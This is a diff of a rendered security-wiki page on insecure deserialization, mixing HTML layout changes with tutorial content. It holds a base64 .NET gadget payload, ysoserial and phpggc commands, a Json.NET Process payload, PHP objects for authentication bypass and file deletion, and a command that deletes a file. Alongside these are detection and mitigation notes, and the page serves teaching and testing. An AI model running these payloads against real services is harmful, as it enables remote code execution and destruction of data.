QUFrVkFBQUFDZ3M9Cw<span style="color:#f92672">==</span>
-</span></span></code></pre></div><p>**Formatters**</p>
+</span></span><span style="display:flex;"><span>AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKgfQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFWlRlWE4wWlcwc1ZtVnljMmx2YmowMExqQXVNQzR3TEVOMWJIUjFjbVU5Ym1WMWRISmhiQ3hRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJRRUFBQUJBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV011VTI5eWRHVmtVMlYwWURGYlcxTjVjM1JsYlM1VGRISnBibWNzYlhOamIzSnNhV0pkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSVNWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxrTnZiWEJoY21semIyNURiMjF3WVhKbGNtQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxHMXpZMjl5YkdsaVhWMElBZ0FBQUFJQUFBQUpBd0FBQUFJQUFBQUpCQUFBQUFRREFBQUFTVk41YzNSbGJTNURiMnhzWldOMGFXOXVjeTVIWlc1bGNtbGpMa052YlhCaGNtbHpiMjVEYjIxd1lYSmxjbUF4VzF0VGVYTjBaVzB1VTNSeWFXNW5MRzF6WTI5eWJHbGlYVjBCQUFBQUMxOWpiMjF3WVhKcGMyOXVBeUpUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUVVBQUFBUkJBQUFBQUlBQUFBR0JnQUFBQUFHQndBQUFQMExQRkpsYzI5MWNtTmxSR2xqZEdsdmJtRnllU0I0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenBoUFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJZ2VHMXNibk02WWowaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlJSGh0Ykc1ek9tTTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtOdmJtWnBaM1Z5WVhScGIyNDdZWE56WlcxaWJIazlVM2x6ZEdWdExrTnZibVpwWjNWeVlYUnBiMjRpSUhodGJHNXpPbVE5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdExsSmxabXhsWTNScGIyNDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnWVRwTFpYazlJblI1Y0dVaUlFOWlhbVZqZEZSNWNHVTlJbnRoT2xSNWNHVWdZanBVZVhCbGZTSWdUV1YwYUc5a1RtRnRaVDBpUjJWMFZIbHdaU0krUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1TlpYUm9iMlJRWVhKaGJXVjBaWEp6UGp4aU9sTjBjbWx1Wno1VGVYTjBaVzB1VjI5eWEyWnNiM2N1UTI5dGNHOXVaVzUwVFc5a1pXd3VRWEJ3VTJWMGRHbHVaM01zVTNsemRHVnRMbGR2Y210bWJHOTNMa052YlhCdmJtVnVkRTF2WkdWc0xGWmxjbk5wYjI0OU5DNHdMakF1TUN4RGRXeDBkWEpsUFc1bGRYUnlZV3dzVUhWaWJHbGpTMlY1Vkc5clpXNDlNekZpWmpNNE5UWmhaRE0yTkdVek5Ud3ZZanBUZEhKcGJtYytQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKbWFXVnNaQ0lnVDJKcVpXTjBTVzV6ZEdGdVkyVTlJbnRUZEdGMGFXTlNaWE52ZFhKalpTQjBlWEJsZlNJZ1RXVjBhRzlrVG1GdFpUMGlSMlYwUm1sbGJHUWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4WWpwVGRISnBibWMrWkdsellXSnNaVUZqZEdsMmFYUjVVM1Z5Y205bllYUmxVMlZzWldOMGIzSlVlWEJsUTJobFkyczhMMkk2VTNSeWFXNW5QanhrT2tKcGJtUnBibWRHYkdGbmN6NDBNRHd2WkRwQ2FXNWthVzVuUm14aFozTStQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKelpYUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdVM1JoZEdsalVtVnpiM1Z5WTJVZ1ptbGxiR1I5SWlCTlpYUm9iMlJPWVcxbFBTSlRaWFJXWVd4MVpTSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2s5aWFtVmpkQzgrUEdJNlFtOXZiR1ZoYmo1MGNuVmxQQzlpT2tKdmIyeGxZVzQrUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVRXVjBhRzlrVUdGeVlXMWxkR1Z5Y3o0OEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNDhUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlJR0U2UzJWNVBTSnpaWFJOWlhSb2IyUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdZVHBUZEdGMGFXTWdZenBEYjI1bWFXZDFjbUYwYVc5dVRXRnVZV2RsY2k1QmNIQlRaWFIwYVc1bmMzMGlJRTFsZEdodlpFNWhiV1U5SWxObGRDSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2xOMGNtbHVaejV0YVdOeWIzTnZablE2VjI5eWEyWnNiM2REYjIxd2IyNWxiblJOYjJSbGJEcEVhWE5oWW14bFFXTjBhWFpwZEhsVGRYSnliMmRoZEdWVFpXeGxZM1J2Y2xSNWNHVkRhR1ZqYXp3dllqcFRkSEpwYm1jK1BHSTZVM1J5YVc1blBuUnlkV1U4TDJJNlUzUnlhVzVuUGp3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrMWxkR2h2WkZCaGNtRnRaWFJsY25NK1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStQQzlTWlhOdmRYSmpaVVJwWTNScGIyNWhjbmsrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUF1VTNsemRHVnRMa1oxYm1OZ01sdGJVM2x6ZEdWdExsTjBjbWx1WjEwc1cxTjVjM1JsYlM1UFltcGxZM1JkWFFZTUFBQUFDRzF6WTI5eWJHbGlDZ1lOQUFBQVZWQnlaWE5sYm5SaGRHbHZia1p5WVcxbGQyOXlheXhXWlhKemFXOXVQVFF1TUM0d0xqQXNRM1ZzZEhWeVpUMXVaWFYwY21Gc0xGQjFZbXhwWTB0bGVWUnZhMlZ1UFRNeFltWXpPRFUyWVdRek5qUmxNelVHRGdBQUFDQlRlWE4wWlcwdVYybHVaRzkzY3k1TllYSnJkWEF1V0dGdGJGSmxZV1JsY2dZUEFBQUFCVkJoY25ObENSQUFBQUFFQ1FBQUFDOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ1lBQUFBRVRtRnRaUXhCYzNObGJXSnNlVTVoYldVSlEyeGhjM05PWVcxbENWTnBaMjVoZEhWeVpRcE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQUFNSURWTjVjM1JsYlM1VWVYQmxXMTBKRHdBQUFBa05BQUFBQ1E0QUFBQUdGQUFBQUNKVGVYTjBaVzB1VDJKcVpXTjBJRkJoY25ObEtGTjVjM1JsYlM1VGRISnBibWNwQ0FBQUFBb0JDZ0FBQUFrQUFBQUdGUUFBQUFkRGIyMXdZWEpsQ1F3QUFBQUdGd0FBQUExVGVYTjBaVzB1VTNSeWFXNW5CaGdBQUFBclNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaGtBQUFBa1UzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1WjExZENRd0FBQUFLQ1F3QUFBQUpGd0FBQUFrVkFBQUFDZ3M9Cw<span style="color:#f92672">==</span></span></span></code></pre></div><p>**Formatters**</p>
 <p>![](<a href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Insecure%20Deserialization/Images/NETNativeFormatters.png" target="_blank" rel="noreferrer noopener nofollow">https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Insecure%20Deserialization/Images/NETNativeFormatters.png</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">)</p>
 <p>#### XMLSerializer</p>
 <p>- In C# source code, look for <code>XmlSerializer(typeof(&lt;TYPE&gt;));</code></p>
 <p>- The attacker must control the **type** of the XmlSerializer.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$ .<span style="color:#ae81ff">\\</span>ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c <span style="color:#e6db74">&#34;calc.exe&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -1847,23 +1809,20 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20;   &lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;/root&gt;
-</span></span></code></pre></div><p>#### DataContractSerializer</p>
+</span></span><span style="display:flex;"><span>&lt;/root&gt;</span></span></code></pre></div><p>#### DataContractSerializer</p>
 <p>- The DataContractSerializer deserializes in a loosely coupled way. It never reads common language runtime (CLR) type and assembly names from the incoming data. The security model for the XmlSerializer is similar to that of the DataContractSerializer, and differs mostly in details. For example, the XmlIncludeAttribute attribute is used for type inclusion instead of the KnownTypeAttribute attribute.</p>
 <p>- In C# source code, look for <code>DataContractSerializer(typeof(&lt;ATTACKER\_CONTROLLED&gt;))</code></p>
 <p>- Payload output: **XML**</p>
 <p>#### **NetDataContractSerializer**</p>
 <p>- It extends the <code>System.Runtime.Serialization.XmlObjectSerializer</code> class and is capable of serializing any type annotated with serializable attribute as <code>BinaryFormatter</code></p>
 <p>- In C# source code, look for NetDataContractSerializer().ReadObject()</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\\</span>ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c <span style="color:#e6db74">&#34;calc.exe&#34;</span> -o base64 -t
-</span></span></code></pre></div><p>#### **LosFormatter**</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\\</span>ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c <span style="color:#e6db74">&#34;calc.exe&#34;</span> -o base64 -t</span></span></code></pre></div><p>#### **LosFormatter**</p>
 <p>- Use <code>BinaryFormatter</code> internally.</p>
 <pre tabindex="0"><code>
-.\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c &#34;calc.exe&#34; -o base64 -t
-</code></pre><p>#### **JSON.NET**</p>
+.\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c &#34;calc.exe&#34; -o base64 -t</code></pre><p>#### **JSON.NET**</p>
 <p>- In C# source code, look for <code>JsonConvert.DeserializeObject&lt;Expected&gt;(json, new JsonSerializerSettings</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\\</span>ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c <span style="color:#e6db74">&#34;calc.exe&#34;</span> -t
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
@@ -1882,14 +1841,12 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20;   &#39;ObjectInstance&#39;:{&#39;$type&#39;:&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>#### **BinaryFormatter**</p>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div><p>#### **BinaryFormatter**</p>
 <p>- The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they&rsquo;re processing to be trustworthy. BinaryFormatter is insecure and can’t be made secure.</p>
 <p>- In C# source code, look for <code>System.Runtime.Serialization.Binary.BinaryFormatter</code></p>
 <p>- Exploitation requires <code>\[Serializable]</code> or <code>ISerializable</code> interface.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c <span style="color:#e6db74">&#34;calc&#34;</span> -t
-</span></span></code></pre></div><p>## Detection</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c <span style="color:#e6db74">&#34;calc&#34;</span> -t</span></span></code></pre></div><p>## Detection</p>
 <p>**Whitebox Testing**</p>
 <p>- PHP Based Application</p>
 <p>    - **<code>serialize()</code>**</p>
@@ -1917,17 +1874,15 @@ X-Auth-Token
 <p>### Authentication Bypass</p>
 <p>- In case of PHP serialization one can craft a payload like this to bypass authentication mechanisms</p>
 <p>- here setting the admin boolean value to true.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>O:4:<span style="color:#e6db74">&#34;User&#34;</span>:2:<span style="color:#f92672">{</span>s:8:<span style="color:#e6db74">&#34;username&#34;</span>;s:6:<span style="color:#e6db74">&#34;wiener&#34;</span>;s:5:<span style="color:#e6db74">&#34;admin&#34;</span>;b:1;<span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>### Deleting Arbitrary Files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>O:4:<span style="color:#e6db74">&#34;User&#34;</span>:2:<span style="color:#f92672">{</span>s:8:<span style="color:#e6db74">&#34;username&#34;</span>;s:6:<span style="color:#e6db74">&#34;wiener&#34;</span>;s:5:<span style="color:#e6db74">&#34;admin&#34;</span>;b:1;<span style="color:#f92672">}</span></span></span></code></pre></div><p>### Deleting Arbitrary Files</p>
 <p>- In case of PHP serialization, one can submit this type of payload to delete any server side files.</p>
 <p>- The application by default sending a base64 encoded PHP serialized object to handle different account deletion functionalities. The functionality can be misused to delete any server side files.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>O:4:<span style="color:#e6db74">&#34;User&#34;</span>:3:<span style="color:#f92672">{</span>s:8:<span style="color:#e6db74">&#34;username&#34;</span>;s:5:<span style="color:#e6db74">&#34;wiener&#34;</span>;s:12:<span style="color:#e6db74">&#34;access\_token&#34;</span>;s:32:<span style="color:#e6db74">&#34;orwtljhce6nd12glundbn07ori09nte7&#34;</span>;s:11:<span style="color:#e6db74">&#34;avatar\_link&#34;</span>;s:18:<span style="color:#e6db74">&#34;users/wiener/avatar&#34;</span>;<span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>### Object Injection</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>O:4:<span style="color:#e6db74">&#34;User&#34;</span>:3:<span style="color:#f92672">{</span>s:8:<span style="color:#e6db74">&#34;username&#34;</span>;s:5:<span style="color:#e6db74">&#34;wiener&#34;</span>;s:12:<span style="color:#e6db74">&#34;access\_token&#34;</span>;s:32:<span style="color:#e6db74">&#34;orwtljhce6nd12glundbn07ori09nte7&#34;</span>;s:11:<span style="color:#e6db74">&#34;avatar\_link&#34;</span>;s:18:<span style="color:#e6db74">&#34;users/wiener/avatar&#34;</span>;<span style="color:#f92672">}</span></span></span></code></pre></div><p>### Object Injection</p>
 <p>- A malicious serialized object can be crafted to inject it server side for exploitation</p>
 <p>- Here is an example PHP code</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&lt;?php
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -2004,19 +1959,16 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>?&gt;
-</span></span></code></pre></div><p>- One can craft a object like this to delete any server side file</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>O:14:<span style="color:#e6db74">&#34;CustomTemplate&#34;</span>:1:<span style="color:#f92672">{</span>s:14:<span style="color:#e6db74">&#34;lock\_file\_path&#34;</span>;s:23:<span style="color:#e6db74">&#34;/home/carlos/morale.txt&#34;</span>;<span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>### Remote Command Execution</p>
+</span></span><span style="display:flex;"><span>?&gt;</span></span></code></pre></div><p>- One can craft a object like this to delete any server side file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>O:14:<span style="color:#e6db74">&#34;CustomTemplate&#34;</span>:1:<span style="color:#f92672">{</span>s:14:<span style="color:#e6db74">&#34;lock\_file\_path&#34;</span>;s:23:<span style="color:#e6db74">&#34;/home/carlos/morale.txt&#34;</span>;<span style="color:#f92672">}</span></span></span></code></pre></div><p>### Remote Command Execution</p>
 <p>- Different tool can be used to exploit RCE vulnerabilities in different frameworks</p>
 <p>- **<code>phpggc</code>**</p>
 <p>    - This tools helps to exploit any PHP based serialization and deserialization</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>./phpggc Laravel/RCE2 <span style="color:#e6db74">&#39;&lt;?php echo system($\_REQUEST\[&#39;</span>cmd<span style="color:#e6db74">&#39;])?&gt;&#39;</span>
-</span></span></code></pre></div><p>- **<code>ysoserial</code>**</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./phpggc Laravel/RCE2 <span style="color:#e6db74">&#39;&lt;?php echo system($\_REQUEST\[&#39;</span>cmd<span style="color:#e6db74">&#39;])?&gt;&#39;</span></span></span></code></pre></div><p>- **<code>ysoserial</code>**</p>
 <p>    - This tool can be used to exploit any Java based serialization and deserialization</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>java <span style="color:#ae81ff">\\</span>                  
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20; --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \\</span>
@@ -2029,8 +1981,7 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20; --add-opens=java.base/java.util=ALL-UNNAMED \\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20; -jar ysoserial-all.jar CommonsCollections3 &#34;rm /home/carlos/morale.txt&#34; &gt; test</span>
-</span></span></code></pre></div><p>## Mitigation and Prevention</p>
+</span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20; -jar ysoserial-all.jar CommonsCollections3 &#34;rm /home/carlos/morale.txt&#34; &gt; test</span></span></span></code></pre></div><p>## Mitigation and Prevention</p>
 <p>### Avoiding deserialization of untrusted data</p>
 <p>Unsafe Sources</p>
 <p>- HTTP Requests Headers and Parameters</p>
@@ -2094,49 +2045,62 @@ X-Auth-Token
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Insecure%20Deserialization.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Information-Gathering/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Information Gathering</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="flex align-center">
+        <span>Insecure Direct Object Reference (IDOR)</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2145,15 +2109,24 @@ X-Auth-Token
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
